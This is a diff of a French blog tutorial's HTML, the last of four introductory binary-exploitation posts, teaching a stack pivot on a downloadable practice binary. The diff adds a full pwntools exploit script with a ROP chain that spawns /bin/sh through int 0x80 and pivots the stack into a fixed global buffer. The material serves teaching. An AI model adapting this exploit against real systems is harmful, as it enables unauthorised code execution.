@@ -24,20 +24,10 @@ Share</title>
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="PWN 4/4 : Stack Pivot ToZeMoon !"/>
-<meta name="twitter:description" content="Bienvenue pour ce 4ème et dernier article d&rsquo;introduction au pwn.
-Je vous avais promis du lourd pour le final, chose dite, chose due !
-L&rsquo;exploit ne sera pas très long, mais en prévision : Une technique sympa, du reverse, et un outil open source qui vend du rêve !
-Vous qui avez tenu les 3 articles précédents, j&rsquo;espère que vous êtes toujours chauds !
-Top départ : Reconnaissance !
-Bonjour petit programme, que fais-tu dans la vie ?"/>
+<meta name="twitter:description" content="Les bases de l&#39;exploitation binaires sont normalement acquises, c&#39;est parti pour une exploitation pratique d&#39;un stack pivot !"/>
 
 <meta property="og:title" content="PWN 4/4 : Stack Pivot ToZeMoon !" />
-<meta property="og:description" content="Bienvenue pour ce 4ème et dernier article d&rsquo;introduction au pwn.
-Je vous avais promis du lourd pour le final, chose dite, chose due !
-L&rsquo;exploit ne sera pas très long, mais en prévision : Une technique sympa, du reverse, et un outil open source qui vend du rêve !
-Vous qui avez tenu les 3 articles précédents, j&rsquo;espère que vous êtes toujours chauds !
-Top départ : Reconnaissance !
-Bonjour petit programme, que fais-tu dans la vie ?" />
+<meta property="og:description" content="Les bases de l&#39;exploitation binaires sont normalement acquises, c&#39;est parti pour une exploitation pratique d&#39;un stack pivot !" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://thinkloveshare.github.io/fr/hacking/pwn_4of4_stack_pivot/" /><meta property="article:published_time" content="2018-05-10T00:00:00&#43;00:00"/>
 <meta property="article:modified_time" content="2018-05-10T00:00:00&#43;00:00"/><meta property="og:site_name" content="ThinkLoveShare" />
@@ -202,7 +192,7 @@ Thoughts &amp; Feels
     
     
     <br/>
-    <i class="fas fa-clock"></i> 6 min read
+    <i class="fas fa-clock"></i> 7 min read
 </div>
 
 
@@ -217,9 +207,15 @@ Thoughts &amp; Feels
 
 <p>Vous qui avez tenu les 3 articles précédents, j&rsquo;espère que vous êtes toujours chauds !</p>
 
+<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/lets_go.jpg" alt="lets_go" ></p>
+
 <p>Top départ : Reconnaissance !</p>
 
+<p>Le binaire étudié est téléchargable <a href="/hacking/pwn_4of4_stack_pivot/vuln">ici</a> !</p>
+
 <p>Bonjour petit programme, que fais-tu dans la vie ?</p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/recon.png" alt="recon" ></p>
 
 <p>Meh, not much&hellip;</p>
 
@@ -237,7 +233,9 @@ Thoughts &amp; Feels
 
 <p>Je sais que le screen est difficilement lisible en taille normal, mais j&rsquo;ai mis la résolution source, et j&rsquo;ai check sur tel et pc, en zoomant c&rsquo;est pixel-perfect !</p>
 
-<p>Deso / Pas deso, il faut voir plus gros ! ¯_(ツ)_/¯</p>
+<p>Deso / Pas deso, il faut voir plus gros ! <code>¯\_(ツ)_/¯</code></p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/cutter.png" alt="cutter" ></p>
 
 <p>Présentation brève de l&rsquo;interface :</p>
 
@@ -257,9 +255,15 @@ Thoughts &amp; Feels
 
 <p>Mais là&hellip; Vous auriez déjà du tilter&hellip; :x</p>
 
+<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/ffs.jpg" alt="ffs" ></p>
+
 <p>Petit apercu du flot d&rsquo;exécution (à partir du main), toujours via Cutter :</p>
 
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/graph_call.png" alt="graph_call" ></p>
+
 <p>Un peu la flemme d&rsquo;analyser ca en profondeur&hellip; Pseudo code s&rsquo;il vous plaît ?</p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pseudo_code.png" alt="pseudo_code" ></p>
 
 <p>On voit tout de suite que la décompilation est partielle, on voit plein de choses intéressantes, mais on n&rsquo;a pas un code C clair comme on aimerait&hellip; Bah on va faire avec !</p>
 
@@ -277,6 +281,8 @@ Thoughts &amp; Feels
 
 <p>scanf correspond à &ldquo;room name&rdquo;. On fait un ou deux essais quand même pour être sûr de contrôler le point de crash :</p>
 
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/crash.png" alt="crash" ></p>
+
 <p>Point de crash confirmé !</p>
 
 <p>Avant de chercher l&rsquo;offset, il y a une chose supplémentaire à repérer, qui nous servira &gt;PEUT ÊTREEEEE&lt; par la suite&hellip; Je dis ca je dis rien&hellip; Pour les chercheurs, c&rsquo;est dans le premier screenshot de code, pour les autres, la lecture continue :</p>
@@ -287,11 +293,15 @@ Thoughts &amp; Feels
 
 <p>push 0x3ff // taille : 1023</p>
 
-<p>push obj.username // adresse : 0x80eb2c0 char *fgets(&hellip;) // saisie utilisateur</p>
+<p>push obj.username // adresse : 0x80eb2c0 char * fgets(&hellip;) // saisie utilisateur</p>
 
 <p>Autrement dit, le programme va toujours mettre au même endroit (0x80eb2c0) jusqu&rsquo;à 1023 bytes saisis par l&rsquo;utilisateur&hellip; Ca peut se justifier&hellip; Mais ca peut être utile non ? Who knows ! :)</p>
 
 <p>Maintenant, l&rsquo;offset !</p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_create.png" alt="pattern_create" ></p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_search.png" alt="pattern_search" ></p>
 
 <p>On crash sur un ret : Habituel, classique, cool.</p>
 
@@ -303,6 +313,8 @@ Thoughts &amp; Feels
 
 <p>Mais&hellip; On a ESP + 4 ? Oui. On sait faire une addition ? Oui.</p>
 
+<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/coincidence.gif" alt="coincidence" ></p>
+
 <p>Vous commencez, je l&rsquo;espère, à voir où je veux en venir ? :)</p>
 
 <p>On sait où stocker des bytes. On contrôle EIP vu qu&rsquo;on contrôle ESP sur un ret. On connaît l&rsquo;offset, et on sait comment modifier ESP pour qu&rsquo;il prenne la valeur de notre choix&hellip; Yapluka !</p>
@@ -313,9 +325,66 @@ Thoughts &amp; Feels
 
 <p>Je passe la préparation de la ropchain car c&rsquo;est exactement comme dans l&rsquo;article précédent, on va tout de suite faire notre exploit :</p>
 
+<pre><code class="language-python">#!/usr/bin/env python2
+
+from pwn import *
+
+# Setting up
+context.log_level = &quot;debug&quot;
+
+ropchain = ''
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea340)  # @ .data
+ropchain += p32(0x080bb696)  # popayloadeax ; ret
+ropchain += '/bin'
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea344)  # @ .data + 4
+ropchain += p32(0x080bb696)  # popayloadeax ; ret
+ropchain += '//sh'
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x080545b0)  # xor eax, eax ; ret
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x080481a9)  # popayloadebx ; ret
+ropchain += p32(0x080ea340)  # @ .data
+ropchain += p32(0x080c18cc)  # popayloadecx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x080545b0)  # xor eax, eax ; ret
+ropchain += p32(0x0807b64f) * 11 # inc eax ; ret
+ropchain += p32(0x080494b1)  # int 0x80
+
+p = process(&quot;./vuln&quot;)
+p.recv()
+p.sendline(ropchain)
+p.recv()
+&quot;&quot;&quot;
+0x08048fc9 &lt;+397&gt;:	lea    esp,[ecx-0x4]
+0x08048fcc &lt;+400&gt;:	ret
+On ajoute donc 4 a user name pour compenser le -0x4
+&quot;&quot;&quot;
+usernameAddr = 0x80EB2C0
+ESP = usernameAddr + 4 # Fix the offset before ret
+p.sendline(&quot;1&quot; * 28 + p32(ESP))
+p.recv()
+p.sendline(&quot;10&quot;)
+p.recv()
+p.interactive()
+</code></pre>
+
 <p>On le lance, ce serait quand même fou que ca fonctionne du premier coup non ? :O</p>
 
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/run_exploit.png" alt="run_exploit" ></p>
+
 <p>Bim, shell, first try, too IZI mannnn !</p>
+
+<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/like_a_boss.jpg" alt="like_a_boss" ></p>
 
 <p>Sauf que&hellip; Sauf que non.</p>
 
@@ -331,13 +400,7 @@ Thoughts &amp; Feels
 
 <p>Vos nombreux retours me font très très plaisir, merci ! ^.^</p>
 
-<p>Pour ceux qui veulent donner un coup de pouce, le mieux reste le partage du blog : thinkloveshare.blogspot.com</p>
-
-<p>Et pour ceux qui veulent suivre les prochaines sorties (SPOIL : qui seront bien moins fréquentes que ces 4 articles&hellip;), follow le twitter des familles : <a href="https://twitter.com/TheLaluka">https://twitter.com/TheLaluka</a></p>
-
-<p>En vous souhaitant une agréable journée, et un bon pwn,</p>
-
-<p>-Laluka</p>
+<p>En vous souhaitant un pwn heureux,</p>
 
   </div>
   
